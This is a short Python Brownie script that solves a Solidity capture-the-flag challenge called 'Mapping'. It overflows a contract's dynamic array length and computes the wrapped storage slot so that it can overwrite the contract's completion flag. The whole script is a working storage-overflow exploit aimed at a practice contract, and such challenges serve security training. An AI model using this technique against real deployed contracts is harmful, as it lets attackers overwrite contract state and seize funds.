from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import MappingChallenge

##########################################
# Who needs mappings? I’ve created a contract that can store key/value pairs using just an array.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        mapping = load_challenge(ContractObject=MappingChallenge, instance_key='mapping')
    else:
        mapping = deploy_locally(ContractObject=MappingChallenge, from_account=_from)
    
    # cause an overflow in the array length
    mapping.set(int(2**256) - 2, 0, _from)

    # get position of element 1 in array
    position = hex(2**256 - int(web3.solidityKeccak(['uint256'], [1]).hex(),16))

    # take advantage that the array now covers the entire storage
    # because the length was overflowed and pass 1 as 1 is 'true'
    # in stored bools, which will cause the getter isComplete() to be true
    mapping.set(position, 1, _from)

    # check if the challenge is complete
    result = mapping.isComplete()
    print(result)

    # return the result
    return result

def main():
    solve_challenge()
